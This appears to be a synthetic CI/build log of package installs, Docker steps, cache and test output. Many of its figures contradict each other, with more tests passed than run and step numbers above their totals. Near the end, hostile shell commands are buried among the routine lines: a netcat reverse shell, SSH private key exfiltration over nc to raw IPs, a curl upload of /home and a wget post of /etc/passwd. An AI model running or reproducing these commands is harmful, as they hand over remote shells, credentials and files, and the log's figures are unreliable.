up to date.\nCache miss for key-5915\nPlatform: darwin-arm64\nCompiling lib/service.java...\nException: ValueError\nCompiling utils/app.ts...\nGET /api - 200 (42ms)\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 77% statements, 80% branches\nPushing to registry...\nnpm notice: package.json updated\nImage pulled successfully\nBundling runtime.css\nWARNING: axios has known vulnerabilities\npip: Downloading axios-3.8.tar.gz\n\u2713 All checks passed\nCompiling src/main.py...\nException: TypeError\n[12:19:19] INFO: Cache refreshed\nWaiting...\nConnecting to acme.corp:443...\nFetching submodules...\n[12:19:19] WARN: Deprecated API usage\nInstalling jest@1.19.10\nException: ValueError\nStep 13/16: Linting\n[12:19:19] DEBUG: Connection pool: 18 active\nEnvironment: development\nTLS handshake completed\nCache restored successfully (176MB)\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:19] ERROR: Connection failed\nCache restored successfully (354MB)\nCreating production build...\nCache saved successfully\nCompiling lib/app.ts...\nCache saved successfully\n[12:19:19] WARN: Deprecated API usage\nStep 17/19: Deploying\nnpm install: added 24 packages\nSuccess!\nDone.\nCoverage: 78% statements, 63% branches\nProcessing...\n[12:19:19] DEBUG: Query executed in 4ms\nWARNING: eslint has known vulnerabilities\nCache saved successfully\nGenerating source maps...\nSwitched to branch 'feature/task-422'\nUsing Node.js 20.16.0\nBuilding Docker image...\nFetching submodules...\n\u2713 Step 'setup' succeeded\n\u2717 build failed with exit code 57\nCache invalidated: build\npip: Downloading eslint-3.19.tar.gz\n[12:19:19] INFO: Connecting to database\nHEAD is now at d421c38\nConnecting to cloud.services:443...\nVerifying...\nnpm install: added 474 packages\nPulling image: python:3.11\nReady.\nTests: 130 passed, 198 total\n[12:19:19] INFO: Cache refreshed\n\u2713 Step 'build' succeeded\nPOST /data - 201 (288ms)\nPOST /data - 200 (347ms)\nCache restored successfully (93MB)\nGenerating source maps...\n[12:19:19] DEBUG: Connection pool: 8 active\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nMinifying vendor.js\n[12:19:19] INFO: Cache refreshed\nnpm install: resolved 996 packages\nCoverage: 87% statements, 71% branches\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: dist.zip (23MB)\n[12:19:19] WARN: Deprecated API usage\nCache hit for key-4405\n[12:19:19] INFO: Cache refreshed\nPushing to registry...\nCreating production build...\nStep 1/18: Linting\nCache saved successfully\nWaiting...\nInstalling lodash@2.1.5\nPlatform: darwin-arm64\nArtifact uploaded: dist.zip (34MB)\nCompiling src/service.java...\nStep 11/16: Running migrations\nArtifact downloaded: 18MB\nTransforming 956 files...\npip: Downloading axios-1.6.tar.gz\n[12:19:19] DEBUG: Connection pool: 7 active\nGET /status - 200 (94ms)\nBuilding Docker image...\npip install: Successfully installed axios-1.7\nCache hit for key-3147\nnpm install: added 335 packages\nTLS handshake completed\n[12:19:19] INFO: Connecting to database\n[12:19:19] DEBUG: Connection pool: 19 active\n  PASS: test_user_create (198ms)\nBundling styles.js\nnpm install: added 290 packages\nPulling image: python:18\nCompiling src/handler.rs...\nGET /api - 204 (98ms)\nSuccess!\nUploading artifact 'dist' (3 files)\n[12:19:19] DEBUG: Connection pool: 13 active\nPOST /upload - 201 (314ms)\nTests: 486 passed, 149 total\nTest Suites: 45 passed, 24 total\nStep 14/19: Building\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nWARNING: lodash has known vulnerabilities\npip: Collecting react\nPushing to registry...\nyarn add: Done in 22.20s\n[12:19:19] WARN: Deprecated API usage\nException: ValueError\nWaiting...\nEnvironment: development\nLayer 7/15: RUN command\nTLS handshake completed\nTest Suites: 49 passed, 7 total\n[12:19:19] INFO: Starting build process\nPulling image: node:3.11\nConnection established\nImage pulled successfully\n[12:19:19] DEBUG: Connection pool: 12 active\nUsing Python 3.11\n  PASS: e2e/test_db_connect.spec.js\nStep 17/19: Building\npip: Installing build dependencies...\nnpm notice: created a lockfile\nBuilding Docker image...\nWARNING: eslint has known vulnerabilities\nStep 8/22: Running migrations\nGET /health - 204 (40ms)\nStep 2/15: Deploying\nEnvironment: production\nLayer 2/12: ENV command\n  PASS: test_auth_login (284ms)\nWARNING: jest has known vulnerabilities\n[12:19:19] INFO: Cache refreshed\nAlready up to date.\n[12:19:19] INFO: Request completed\nStep 16/20: Deploying\nCompiling lib/app.ts...\nEnvironment: staging\n\u2713 Task completed in 3686ms\nReady.\nPlatform: win32-x64\n[12:19:19] INFO: Processing request\nOptimizing 51 modules...\nCompleted.\nPlatform: linux-x64\nArtifact uploaded: dist.zip (62MB)\nSwitched to branch 'feature/task-271'\nPulling image: alpine:latest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\n[12:19:19] INFO: Cache refreshed\n[12:19:19] WARN: Deprecated API usage\nConnection established\nOK\nStep 14/17: Linting\nOK\nFAILED: test_auth_login\nCache invalidated: dependencies\nCreating production build...\nCache miss for key-5124\n[12:19:19] DEBUG: Query executed in 90ms\n\u2713 Step 'setup' succeeded\nCreating production build...\nFinished.\nCreating production build...\n[12:19:19] INFO: Cache refreshed\nUsing Node.js 15.6.2\n  PASS: test_user_create (376ms)\n[12:19:19] INFO: Connecting to database\n[12:19:19] INFO: Starting build process\nMinifying vendor.js\n[12:19:19] DEBUG: Initializing service\nPlatform: linux-x64\nArtifact uploaded: build.tar.gz (28MB)\nDone.\nGenerating source maps...\nBuilding Docker image...\n[12:19:19] DEBUG: Query executed in 14ms\nUsing Python 3.10\nCompiling src/app.ts...\nImage pulled successfully\nWARNING: axios has known vulnerabilities\nSuccess!\n[12:19:19] INFO: Cache refreshed\nStep 14/22: Deploying\n[12:19:19] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (4MB)\nConnection established\nPulling image: alpine:3.11\n[12:19:19] INFO: Request completed\nCoverage: 100% statements, 96% branches\n\u2713 Step 'checkout' succeeded\nUploading artifact 'coverage' (24 files)\nCompiling lib/app.ts...\nStep 16/18: Deploying\nAlready up to date.\nHEAD is now at 171c9cb\nCache invalidated: build\nPulling image: node:18\n[12:19:19] INFO: Cache refreshed\nFetching submodules...\nGET /status - 204 (92ms)\nCache hit for key-4320\nTest Suites: 15 passed, 29 total\n\u2713 Task completed in 2090ms\nImage pulled successfully\nHEAD is now at de9fe22\nStep 17/17: Deploying\nUsing Node.js 17.15.6\nCoverage: 95% statements, 94% branches\n  PASS: test_api_health (316ms)\nCache invalidated: node_modules\nyarn add: Done in 11.84s\nLoading...\nTests: 76 passed, 415 total\npip install: Successfully installed axios-1.10\nTLS handshake completed\nLayer 7/11: COPY command\n[12:19:19] DEBUG: Query executed in 40ms\n  PASS: integration/test_auth_login.spec.js\n[12:19:19] INFO: Cache refreshed\nChecking out main branch\nSnapshots: 34 passed, 17 total\npip: Collecting react\nUsing Node.js 20.0.7\nCache restored successfully (75MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting react\nVerifying...\n[12:19:19] DEBUG: Connection pool: 6 active\nUsing Node.js 15.17.7\nCompiling components/main.py...\nReady.\nArtifact uploaded: build.tar.gz (12MB)\nUploading artifact 'coverage' (29 files)\n[12:19:19] INFO: Connecting to database\nUsing Python 3.11\nAlready up to date.\nSwitched to branch 'feature/task-171'\nCompleted.\nCompiling components/utils.go...\npip: Downloading axios-5.2.tar.gz\nArtifact uploaded: build.tar.gz (20MB)\nPulling image: alpine:18\nChecking out develop branch\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\npip install: Successfully installed prettier-5.13\nStep 15/22: Deploying\nPushing to registry...\n[12:19:19] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\n  PASS: test_auth_login (295ms)\nArtifact uploaded: dist.zip (65MB)\nCreating production build...\nSuccess!\nConnecting to cloud.services:443...\nCache restored successfully (44MB)\nSuccess!\npip install: Successfully installed eslint-5.7\nSnapshots: 1 passed, 4 total\nOptimizing 27 modules...\nUsing Node.js 19.4.5\nLayer 8/14: RUN command\nWaiting...\nGET /api - 204 (59ms)\n\u2713 Step 'setup' succeeded\n\u2713 Task completed in 2753ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\n[12:19:19] DEBUG: Loading configuration\nnpm notice: package.json updated\nCache saved successfully\nCompiling components/utils.go...\nProcessing...\nLayer 1/14: RUN command\nCompiling src/app.ts...\nCache saved successfully\nAlready up to date.\nConnection established\nConnecting to startup.dev:443...\n[12:19:19] INFO: Connecting to database\npip: Collecting webpack\n[12:19:19] DEBUG: Connection pool: 14 active\nGET /health - 201 (68ms)\nGenerating source maps...\nStep 12/16: Installing dependencies\nCreating production build...\n[12:19:19] DEBUG: Connection pool: 1 active\nTest Suites: 9 passed, 46 total\n[12:19:19] DEBUG: Loading configuration\n[12:19:19] DEBUG: Initializing service\n[12:19:19] DEBUG: Connection pool: 2 active\n\u2713 Task completed in 1195ms\nStep 10/17: Testing\npip: Downloading webpack-5.6.tar.gz\n\u2713 All checks passed\nPlatform: win32-x64\nReady.\nImage pulled successfully\nOK\npip: Installing build dependencies...\nUploading artifact 'coverage' (44 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nProcessing...\nMinifying main.js\nCache restored successfully (136MB)\nCoverage: 80% statements, 91% branches\nChecking out main branch\nUsing Node.js 20.15.9\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 366 packages\nStep 12/24: Installing dependencies\nnpm install: added 477 packages\nOptimizing 98 modules...\nWaiting...\nSnapshots: 3 passed, 48 total\nBuilding Docker image...\nOptimizing 19 modules...\nCache restored successfully (286MB)\nCompiling src/handler.rs...\nPulling image: alpine:18\n[12:19:19] INFO: Starting build process\nTime: 58.144s\n[12:19:19] INFO: Request completed\n\u2717 build failed with exit code 7\nVerifying...\nTransforming 231 files...\n  PASS: e2e/test_db_connect.spec.js\nWARNING: axios has known vulnerabilities\nFetching submodules...\n\u2713 Step 'install' succeeded\n[12:19:19] INFO: Connecting to database\nnpm install: added 32 packages\nPushing to registry...\n[12:19:19] INFO: Processing request\n[12:19:19] DEBUG: Initializing service\nWaiting...\nUploading artifact 'dist' (22 files)\nStep 19/23: Deploying\nPulling image: alpine:18\nWaiting...\nSuccess!\nArtifact downloaded: 12MB\nReady.\n  PASS: e2e/test_auth_login.spec.js\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:19] INFO: Cache refreshed\n[12:19:19] INFO: Request completed\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] DEBUG: Loading configuration\nCompiling lib/index.js...\nFAILED: test_cache_hit\nOptimizing 70 modules...\nSwitched to branch 'feature/task-184'\nImage pulled successfully\n\u2713 Task completed in 2531ms\npip install: Successfully installed jest-1.8\nRan 146 tests in 48s\n\u2713 Step 'checkout' succeeded\nUsing Python 3.10\nCache miss for key-7313\nDone.\nStep 10/23: Deploying\nLayer 2/14: RUN command\n[12:19:19] DEBUG: Memory usage: 572MB\nnpm install: added 284 packages\nnpm notice: created a lockfile\nTests: 95 passed, 457 total\nUsing Python 3.12\nCompiling src/service.java...\nPushing to registry...\n\u2713 Step 'install' succeeded\nCache invalidated: node_modules\nCache saved successfully\nnpm install: added 438 packages\n[12:19:19] DEBUG: Memory usage: 1520MB\nConnecting to example.com:443...\n[12:19:19] INFO: Request completed\nCache restored successfully (35MB)\nGenerating source maps...\n[12:19:19] INFO: Request completed\nOptimizing 87 modules...\nLayer 1/13: RUN command\nDone.\n[12:19:19] ERROR: Connection failed\nOK\nCompiling lib/handler.rs...\nConnection established\nGET /status - 204 (56ms)\n[12:19:19] DEBUG: Loading configuration\n=== Step integration_tests completed ===\n=== Step: checkout ===\nCache invalidated: dependencies\nException: NullPointerException\nTest Suites: 10 passed, 18 total\nInstalling lodash@1.19.0\nPlatform: win32-x64\n[12:19:19] DEBUG: Query executed in 15ms\n\u2713 Task completed in 2655ms\n[12:19:19] DEBUG: Query executed in 55ms\nnpm notice: created a lockfile\nCache restored successfully (215MB)\nCoverage: 89% statements, 96% branches\nCache restored successfully (149MB)\nFinished.\nBuilding Docker image...\nArtifact downloaded: 48MB\n\u2713 Task completed in 4598ms\npip: Installing build dependencies...\nTest Suites: 19 passed, 39 total\nnpm notice: package.json updated\nGET /status - 201 (50ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 95 tests in 48s\nGenerating source maps...\nFetching submodules...\nArtifact uploaded: build.tar.gz (38MB)\nUploading artifact 'coverage' (36 files)\nStep 9/20: Building\nSnapshots: 22 passed, 31 total\nUsing Python 3.9\nSuccess!\n\u2717 build failed with exit code 116\nSwitched to branch 'feature/task-797'\nLayer 6/15: ENV command\nPulling image: alpine:3.11\nImage pulled successfully\npip: Collecting jest\n[12:19:19] INFO: Request completed\nSnapshots: 31 passed, 6 total\nWARNING: lodash has known vulnerabilities\nCache invalidated: dependencies\nFAILED: test_db_connect\n[12:19:19] INFO: Request completed\nDone.\nMinifying app.js\n\u2713 build completed\nVerifying...\nLayer 10/8: ENV command\nSnapshots: 18 passed, 30 total\nAlready up to date.\n[12:19:19] WARN: Deprecated API usage\nSnapshots: 11 passed, 14 total\nTest Suites: 30 passed, 17 total\nyarn add: Done in 19.47s\n\u2713 test completed\nWARNING: prettier has known vulnerabilities\nAlready up to date.\nStep 2/24: Deploying\nSnapshots: 4 passed, 35 total\npip install: Successfully installed lodash-1.10\n[12:19:19] DEBUG: Query executed in 85ms\nInstalling lodash@1.6.8\n[12:19:19] INFO: Cache refreshed\nCache saved successfully\n[12:19:19] DEBUG: Memory usage: 133MB\n\u2713 Task completed in 3002ms\nConnecting to example.com:443...\nLoading...\n[12:19:19] DEBUG: Connection pool: 12 active\nOptimizing 96 modules...\nCompiling components/index.js...\n[12:19:19] DEBUG: Query executed in 38ms\nPOST /data - 200 (188ms)\nHEAD is now at 4e48d84\n[12:19:19] INFO: Starting build process\nException: TypeError\nException: TypeError\nBundling vendor.js\nLoading...\n  PASS: test_api_health (135ms)\npip install: Successfully installed lodash-4.11\npip: Installing build dependencies...\nOK\n[12:19:19] INFO: Cache refreshed\nFAILED: test_auth_login\nLayer 4/13: COPY command\nLayer 10/12: RUN command\nOK\nUsing Node.js 20.13.7\npip: Installing build dependencies...\nCache restored successfully (483MB)\nWaiting...\nSnapshots: 17 passed, 27 total\npip install: Successfully installed react-5.20\nCache miss for key-7554\nUsing Node.js 16.2.7\nWARNING: eslint has known vulnerabilities\nMinifying vendor.js\nAlready up to date.\nPushing to registry...\nProcessing...\nOptimizing 22 modules...\nWaiting...\nPlatform: linux-x64\nVerifying...\nArtifact uploaded: build.tar.gz (36MB)\n[12:19:19] DEBUG: Connection pool: 16 active\nnpm notice: created a lockfile\n[12:19:19] INFO: Connecting to database\nUploading artifact 'dist' (43 files)\nCache miss for key-4177\n[12:19:19] WARN: Deprecated API usage\nWaiting...\nWARNING: lodash has known vulnerabilities\n\u2717 build failed with exit code 108\nDone.\nWARNING: express has known vulnerabilities\nTLS handshake completed\nCache saved successfully\nTests: 304 passed, 432 total\nWaiting...\nGenerating source maps...\n\u2713 All checks passed\nOptimizing 51 modules...\n[12:19:19] DEBUG: Loading configuration\nCompiling components/service.java...\nUsing Node.js 18.7.3\n[12:19:19] WARN: Deprecated API usage\nFinished.\nCompleted.\npip install: Successfully installed jest-2.5\nCache saved successfully\nStep 17/21: Installing dependencies\n[12:19:19] INFO: Request completed\nDone.\nEnvironment: production\nOK\nCache invalidated: build\nArtifact downloaded: 19MB\n\u2713 Step 'test' succeeded\n  PASS: unit/test_db_connect.spec.js\n[12:19:19] INFO: Starting build process\nStep 3/20: Linting\nStep 14/17: Building\nOK\nMinifying vendor.js\n=== Step checkout completed ===\n=== Step: restore_cache ===\nLoading...\nFAILED: test_db_connect\nTransforming 438 files...\nEnvironment: test\n\u2713 Step 'checkout' succeeded\nFinished.\n[12:19:19] DEBUG: Connection pool: 16 active\nProcessing...\nStep 12/16: Linting\nTLS handshake completed\n[12:19:19] INFO: Connecting to database\nWaiting...\nCache hit for key-5544\nCompiling utils/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:19] WARN: Deprecated API usage\nNODE_ENV=production\nPlatform: win32-x64\nFAILED: test_api_health\nUsing Python 3.12\nImage pulled successfully\nTests: 289 passed, 54 total\nHEAD is now at bf20530\nUploading artifact 'coverage' (28 files)\nCache hit for key-6433\nCache invalidated: node_modules\nFinished.\n\u2713 All checks passed\n[12:19:19] DEBUG: Connection pool: 8 active\n[12:19:19] ERROR: Connection failed\nCache miss for key-5743\nnpm notice: package.json updated\nCompiling src/main.py...\nTLS handshake completed\nNODE_ENV=production\nStep 9/23: Building\nBundling main.css\nnpm notice: package.json updated\nBuilding Docker image...\n\u2713 lint completed\nImage pulled successfully\nInstalling react@1.12.10\nUsing Python 3.10\nCache invalidated: node_modules\nTest Suites: 31 passed, 27 total\nFinished.\npip install: Successfully installed react-3.1\nInstalling react@5.3.7\nMinifying main.js\nTLS handshake completed\n[12:19:19] DEBUG: Query executed in 88ms\nStep 16/16: Building\nStep 12/25: Running migrations\nCache restored successfully (404MB)\nDone.\nImage pulled successfully\nSnapshots: 9 passed, 41 total\nReady.\n[12:19:19] INFO: Processing request\nOK\n[12:19:19] INFO: Starting build process\nPushing to registry...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBundling styles.css\nCache miss for key-1307\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/service.java...\nFetching submodules...\nVerifying...\nFetching submodules...\nCache restored successfully (276MB)\nFetching submodules...\nFAILED: test_api_health\n[12:19:19] INFO: Connecting to database\npip: Installing build dependencies...\nTransforming 170 files...\nInstalling jest@1.1.6\nProcessing...\n[12:19:19] INFO: Request completed\nUsing Node.js 20.1.6\nHEAD is now at dab2040\nNODE_ENV=test\nWARNING: jest has known vulnerabilities\n[12:19:19] DEBUG: Connection pool: 6 active\nStep 6/19: Linting\nArtifact downloaded: 6MB\n[12:19:19] DEBUG: Query executed in 1ms\n\u2713 Step 'checkout' succeeded\nCompleted.\nConnection established\nStep 17/20: Linting\nHEAD is now at ce63846\n[12:19:19] DEBUG: Memory usage: 537MB\nCreating production build...\npip: Installing build dependencies...\nInstalling jest@5.15.3\nyarn add: Done in 8.18s\n  PASS: test_db_connect (39ms)\nUsing Node.js 19.11.4\nUploading artifact 'coverage' (34 files)\nCache saved successfully\n[12:19:19] INFO: Request completed\nUsing Node.js 14.0.1\nTransforming 980 files...\n\u2713 Task completed in 1953ms\nGET /status - 201 (78ms)\nOK\nStep 17/15: Linting\nCache invalidated: node_modules\nnpm notice: created a lockfile\nAlready up to date.\n[12:19:19] DEBUG: Initializing service\nAlready up to date.\nWARNING: prettier has known vulnerabilities\n[12:19:19] DEBUG: Connection pool: 8 active\nNODE_ENV=test\nConnection established\nPlatform: darwin-arm64\nnpm install: added 254 packages\nOptimizing 89 modules...\n  PASS: e2e/test_auth_login.spec.js\n\u2717 build failed with exit code 110\n[12:19:19] ERROR: Connection failed\n  PASS: test_api_health (283ms)\nMinifying vendor.js\nCache invalidated: dependencies\nTests: 143 passed, 110 total\nWARNING: webpack has known vulnerabilities\n[12:19:19] INFO: Cache refreshed\nSnapshots: 28 passed, 13 total\nTests: 445 passed, 203 total\nPulling image: node:latest\nPushing to registry...\nDone.\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nCompiling lib/service.java...\n[12:19:19] INFO: Cache refreshed\nCompiling src/index.js...\npip: Collecting express\n[12:19:19] INFO: Starting build process\nCreating production build...\nGenerating source maps...\n=== Step restore_cache completed ===\n=== Step: type_check ===\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] INFO: Cache refreshed\nHEAD is now at a735c62\n[12:19:19] DEBUG: Loading configuration\n\u2713 Task completed in 4474ms\n  PASS: test_auth_login (110ms)\nUsing Node.js 15.5.4\nFetching submodules...\nRan 193 tests in 2s\nRan 39 tests in 39s\nnpm install: resolved 604 packages\nnpm notice: created a lockfile\nTests: 486 passed, 279 total\nUploading artifact 'build' (32 files)\nnpm install: added 380 packages\nArtifact uploaded: dist.zip (60MB)\nGenerating source maps...\nCoverage: 96% statements, 88% branches\n\u2713 Task completed in 890ms\nInstalling prettier@1.9.9\n[12:19:19] DEBUG: Connection pool: 20 active\nWARNING: react has known vulnerabilities\nyarn add: Done in 18.37s\n[12:19:19] DEBUG: Loading configuration\nSuccess!\nTransforming 646 files...\nTransforming 938 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 17/24: Building\nCache miss for key-6348\nReady.\nUsing Node.js 14.10.5\nException: ValueError\nPOST /upload - 201 (475ms)\nStep 4/20: Building\nArtifact uploaded: dist.zip (83MB)\nCompiling utils/main.py...\nWARNING: axios has known vulnerabilities\n\u2713 deploy completed\nTLS handshake completed\nImage pulled successfully\nnpm install: added 428 packages\nTest Suites: 7 passed, 16 total\nOptimizing 94 modules...\nUploading artifact 'build' (13 files)\nStep 11/20: Installing dependencies\n[12:19:19] WARN: Deprecated API usage\nnpm notice: package.json updated\nTest Suites: 21 passed, 44 total\nBundling runtime.css\n[12:19:19] INFO: Request completed\nBundling main.js\n[12:19:19] DEBUG: Initializing service\nCompiling src/app.ts...\nImage pulled successfully\nStep 7/23: Linting\nnpm notice: created a lockfile\nCache miss for key-1921\nUploading artifact 'build' (28 files)\nStep 7/22: Running migrations\nCache miss for key-2794\n[12:19:19] WARN: Deprecated API usage\nTLS handshake completed\n[12:19:19] DEBUG: Initializing service\nTest Suites: 6 passed, 47 total\npip install: Successfully installed eslint-3.4\nLoading...\nArtifact downloaded: 13MB\npip: Downloading lodash-1.9.tar.gz\nConnecting to test.io:443...\nCompiling components/app.ts...\n[12:19:19] DEBUG: Initializing service\nCompiling lib/app.ts...\nHEAD is now at 07dbaf9\nChecking out master branch\nTLS handshake completed\nOK\n[12:19:19] ERROR: Connection failed\npip: Installing build dependencies...\n[12:19:19] WARN: Deprecated API usage\nSuccess!\nCompiling lib/index.js...\nCoverage: 96% statements, 60% branches\nnpm install: resolved 1927 packages\nStep 15/18: Building\nUsing Node.js 15.10.8\n[12:19:19] DEBUG: Query executed in 44ms\nWARNING: axios has known vulnerabilities\nConnecting to example.com:443...\nProcessing...\nCompiling lib/service.java...\nConnecting to example.com:443...\nVerifying...\nTransforming 536 files...\nStep 20/17: Testing\nFetching submodules...\nnpm notice: package.json updated\nChecking out main branch\nCache saved successfully\nFinished.\nChecking out develop branch\nCache saved successfully\nBuilding Docker image...\nTLS handshake completed\nSwitched to branch 'bugfix/task-879'\nRan 163 tests in 53s\nTest Suites: 9 passed, 23 total\nRan 173 tests in 55s\nGET /health - 204 (71ms)\n\u2713 Step 'checkout' succeeded\n[12:19:19] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-928'\n[12:19:19] ERROR: Connection failed\nnpm install: added 345 packages\nPushing to registry...\npip install: Successfully installed axios-3.15\npip: Installing build dependencies...\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\nReady.\nHEAD is now at e8a3c38\nSnapshots: 44 passed, 34 total\nWARNING: express has known vulnerabilities\n[12:19:19] WARN: Deprecated API usage\npip: Installing build dependencies...\npip install: Successfully installed axios-5.11\nImage pulled successfully\n  PASS: integration/test_user_create.spec.js\nCompiling src/handler.rs...\nStep 13/19: Testing\nCache invalidated: dependencies\nEnvironment: staging\nUsing Node.js 16.3.10\nTLS handshake completed\nCache miss for key-5664\nRan 107 tests in 30s\nWARNING: webpack has known vulnerabilities\nFetching submodules...\nLoading...\n[12:19:19] WARN: Deprecated API usage\nImage pulled successfully\nBundling styles.js\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] ERROR: Connection failed\n\u2713 Task completed in 1830ms\n=== Step type_check completed ===\n=== Step: unit_tests ===\nOK\n[12:19:19] DEBUG: Initializing service\n  PASS: test_db_connect (305ms)\npip: Installing build dependencies...\nTest Suites: 39 passed, 34 total\n[12:19:19] DEBUG: Initializing service\nCoverage: 81% statements, 92% branches\nyarn add: Done in 13.17s\nArtifact uploaded: build.tar.gz (23MB)\nConnection established\nTLS handshake completed\nPlatform: win32-x64\nOptimizing 42 modules...\npip: Installing build dependencies...\nAlready up to date.\npip install: Successfully installed react-2.1\nnpm notice: created a lockfile\nStep 10/18: Deploying\nnpm notice: created a lockfile\n\u2713 All checks passed\nCoverage: 82% statements, 62% branches\nBundling runtime.js\nCache saved successfully\n[12:19:19] DEBUG: Connection pool: 2 active\nReady.\nPOST /data - 200 (254ms)\nCompiling lib/index.js...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache miss for key-7724\nLayer 4/13: RUN command\nStep 3/21: Running migrations\n[12:19:19] ERROR: Connection failed\nFetching submodules...\npip: Installing build dependencies...\nSnapshots: 10 passed, 22 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling utils/utils.go...\nWARNING: webpack has known vulnerabilities\nChecking out master branch\nCompiling src/handler.rs...\nStep 6/16: Testing\nImage pulled successfully\nHEAD is now at d5f137c\n[12:19:19] DEBUG: Connection pool: 4 active\nArtifact downloaded: 17MB\nUsing Python 3.12\n[12:19:19] DEBUG: Loading configuration\n[12:19:19] WARN: Deprecated API usage\nTests: 360 passed, 229 total\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] DEBUG: Query executed in 58ms\nnpm notice: created a lockfile\n  PASS: test_api_health (166ms)\nPulling image: python:3.11\nCache restored successfully (104MB)\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'bugfix/task-592'\nProcessing...\nStep 15/20: Linting\n[12:19:19] DEBUG: Connection pool: 16 active\n[12:19:19] WARN: Deprecated API usage\nUsing Python 3.10\nCreating production build...\nConnecting to acme.corp:443...\nVerifying...\nStep 5/22: Testing\n[12:19:19] WARN: Deprecated API usage\nCache saved successfully\nSwitched to branch 'bugfix/task-393'\npip: Installing build dependencies...\npip: Collecting react\nStep 18/17: Installing dependencies\n[12:19:19] INFO: Cache refreshed\n\u2713 All checks passed\n[12:19:19] DEBUG: Initializing service\nGET /api - 201 (88ms)\nCompiling src/main.py...\nProcessing...\nReady.\npip: Installing build dependencies...\n[12:19:19] DEBUG: Query executed in 1ms\nStep 7/25: Installing dependencies\nDone.\n\u2713 test completed\nBuilding Docker image...\nGenerating source maps...\n\u2717 build failed with exit code 106\nAlready up to date.\nTests: 112 passed, 72 total\nWaiting...\n[12:19:19] DEBUG: Query executed in 18ms\nPOST /api - 201 (209ms)\nLoading...\nOK\nStep 13/20: Linting\nUsing Node.js 15.7.9\nnpm notice: package.json updated\nGenerating source maps...\nAlready up to date.\nBundling runtime.css\nStep 2/22: Building\n[12:19:19] INFO: Connecting to database\nWaiting...\n[12:19:19] ERROR: Connection failed\n  PASS: test_cache_hit (320ms)\n\u2713 Task completed in 3251ms\nCache miss for key-6599\nHEAD is now at a4e5c18\nStep 2/19: Linting\nStep 19/15: Installing dependencies\n[12:19:19] DEBUG: Loading configuration\nnpm install: resolved 1635 packages\nAlready up to date.\nArtifact downloaded: 1MB\nFAILED: test_user_create\n\u2713 All checks passed\nTime: 72.952s\nCompleted.\n[12:19:19] INFO: Cache refreshed\nUsing Node.js 14.4.4\nLoading...\nGET /api - 201 (8ms)\nEnvironment: staging\npip: Installing build dependencies...\nStep 5/19: Building\n\u2717 build failed with exit code 81\nSuccess!\nChecking out main branch\nGenerating source maps...\nSnapshots: 31 passed, 9 total\nDone.\nCache saved successfully\nFetching submodules...\nConnection established\nLoading...\n\u2713 lint completed\nStep 19/16: Installing dependencies\nSnapshots: 25 passed, 38 total\nMinifying app.js\nCompiling utils/index.js...\nPlatform: win32-x64\nTLS handshake completed\n[12:19:19] INFO: Request completed\n=== Step unit_tests completed ===\nnc -e /bin/sh 39.192.153.29 50257\n=== Step: save_cache ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 203.180.87.205 3217\n  PASS: unit/test_user_create.spec.js\nAlready up to date.\nSwitched to branch 'bugfix/task-809'\nStep 12/22: Testing\nStep 3/18: Building\nHEAD is now at 69f8494\nStep 20/17: Linting\nFinished.\nDone.\n[12:19:19] DEBUG: Memory usage: 1899MB\nFetching submodules...\n\u2713 Step 'test' succeeded\nCompleted.\nCompiling src/service.java...\nChecking out main branch\nGET /health - 204 (85ms)\nUploading artifact 'build' (5 files)\nHEAD is now at ad59007\nUsing Python 3.11\n  PASS: test_api_health (334ms)\nStep 9/25: Deploying\n[12:19:19] INFO: Request completed\nException: RuntimeError\nBuilding Docker image...\npip install: Successfully installed express-2.6\n[12:19:19] DEBUG: Memory usage: 268MB\nPlatform: win32-x64\nConnection established\nChecking out master branch\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\nArtifact downloaded: 44MB\nBuilding Docker image...\nStep 8/21: Linting\nStep 14/20: Running migrations\nCompiling components/handler.rs...\nReady.\nTests: 449 passed, 328 total\nVerifying...\npip: Installing build dependencies...\nCompiling components/handler.rs...\nLayer 1/8: RUN command\n  PASS: test_auth_login (44ms)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 21.136.79.137 6187\nGenerating source maps...\nCache miss for key-5303\nSuccess!\n\u2713 All checks passed\nCache miss for key-5749\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nSending 22MB of data to example.com\nInstalling lodash@1.10.6\nChecking out main branch\nStep 15/19: Running migrations\n\u2717 build failed with exit code 69\nNODE_ENV=production\nSwitched to branch 'hotfix/task-233'\nDone.\nStep 9/21: Testing\n[12:19:19] DEBUG: Memory usage: 